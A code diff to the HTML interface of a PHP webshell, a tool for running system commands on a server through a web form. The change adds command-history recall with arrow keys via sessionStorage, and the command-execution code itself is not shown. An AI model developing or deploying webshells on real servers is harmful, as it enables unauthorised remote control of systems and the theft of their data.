@@ -51,8 +51,8 @@
         <title>PHP Webshell</title>
     </head>
     <body style="font-family: sans-serif;">
-        <form method="POST" action="">
-            <input type="text" name="cmd" autofocus="autofocus" style="width: 80%;" />
+        <form id="form-cmd" method="POST" action="">
+            <input type="text" id="cmd" name="cmd" placeholder="Enter command, use arrow keys for history" autofocus="autofocus" style="width: 80%;" />
             <input type="submit" name="submit-cmd" value="Run" />
         </form>
         <div style="margin: 3px auto;">
@@ -113,5 +113,34 @@
                 <input type="submit" name="submit-phpinfo" value="phpinfo()" />
             </form>
         </div>
+        <script>
+            function saveHistory() {
+                var cmd = document.getElementById("cmd").value;
+                if(cmd.trim() != "" && cmd != shellHistory[shellHistory.length - 1]) {
+                    shellHistory.push(cmd);
+                }
+                sessionStorage.setItem("shellHistory", JSON.stringify(shellHistory));
+            }
+            function cycleHistory(event) {
+                if(event.code == "ArrowUp" && historyPos > 0) {
+                    historyPos--;
+                    document.getElementById("cmd").value = shellHistory[historyPos];
+                } else if(event.code == "ArrowDown" && historyPos < shellHistory.length) {
+                    historyPos++;
+                    if(historyPos < shellHistory.length) {
+                        document.getElementById("cmd").value = shellHistory[historyPos];
+                    } else {
+                        document.getElementById("cmd").value = "";
+                    }
+                }
+            }
+            var shellHistory = JSON.parse(sessionStorage.getItem("shellHistory"));
+            if(shellHistory == null) {
+                shellHistory = new Array();
+            }
+            var historyPos = shellHistory.length;
+            document.getElementById("form-cmd").addEventListener("submit", saveHistory);
+            document.getElementById("cmd").addEventListener("keydown", cycleHistory);
+        </script>
     </body>
 </html>
